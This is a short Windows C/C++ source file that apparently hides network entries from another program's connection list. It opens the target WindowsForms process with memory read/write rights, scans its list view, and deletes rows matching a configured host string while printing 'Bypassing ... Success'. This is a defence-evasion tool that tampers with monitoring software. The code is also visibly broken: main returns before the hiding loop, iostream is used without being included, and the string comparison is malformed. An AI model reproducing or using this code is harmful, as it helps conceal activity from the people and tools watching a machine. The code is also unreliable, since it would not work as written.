#include <windows.h>
#include <stdio.h>
#include <commctrl.h>
BOOL CALLBACK hide(HWND,LPARAM);
LVITEM lvi, *_lvi;
char subitem[512];
char *_subitem;
DWORD pid;
HANDLE process;
   
///////////////////////////////////////////
 ////////////   CHANGE HERE ONLY ///////////
char DNS[] = "google.com";
///////////////////////////////////////////
 ///////////////////////////////////////////
     
int main()


{ 
   
HWND hwnd_win = GetForegroundWindow();
    ShowWindow(hwnd_win,SW_HIDE);
    _sleep(4000);
    ShowWindow(hwnd_win,SW_SHOW);
    std::cout<<"it's worked?????";
    system("pause >nul");
    return 0;


 for(;;) { Sleep(100); EnumChildWindows(FindWindow("WindowsForms10.Window.8.app.0.378734a",NULL), hide, 0); } return 0; 
}
     
BOOL CALLBACK hide(HWND hwnd,LPARAM lParam)
{
    BOOL status = TRUE;
    char classname[MAX_PATH] = "";
    GetClassName(hwnd,classname,MAX_PATH);
    if(!strcmp(classname,"WindowsForms10.SysListView32.app.0.378734a") !=NULL)
    {
        status = FALSE;
        int i, count = (int) SendMessage(hwnd, LVM_GETITEMCOUNT, 0, 0);
        GetWindowThreadProcessId(hwnd, &pid);
        process = OpenProcess(PROCESS_VM_OPERATION|PROCESS_VM_READ|PROCESS_VM_WRITE|PROCESS_QUERY_INFORMATION, FALSE, pid);
     
        _lvi=(LVITEM*)VirtualAllocEx(process, NULL, sizeof(LVITEM), MEM_COMMIT, PAGE_READWRITE);
        _subitem=(char*)VirtualAllocEx(process, NULL, 512, MEM_COMMIT, PAGE_READWRITE);
        lvi.cchTextMax = 512;
        for(i=0; i<count; i++) 
        {
            lvi.iSubItem=1;
            lvi.pszText=_subitem;
            WriteProcessMemory(process, _lvi, &lvi, sizeof(LVITEM), NULL);
            SendMessage(hwnd, LVM_GETITEMTEXT, (WPARAM)i, (LPARAM)_lvi);
            ReadProcessMemory(process, _subitem, subitem, 512, NULL);
            if (strstr(subitem,DNS)!=NULL) { printf("Bypassing [%s]...\t--> Success\n",DNS); SendMessage(hwnd, LVM_DELETEITEM, (WPARAM)i, (LPARAM)_lvi); }
        }
        VirtualFreeEx(process, _lvi, 0, MEM_RELEASE);
        VirtualFreeEx(process, _subitem, 0, MEM_RELEASE);
        CloseHandle(process);
    }
    return status;
}
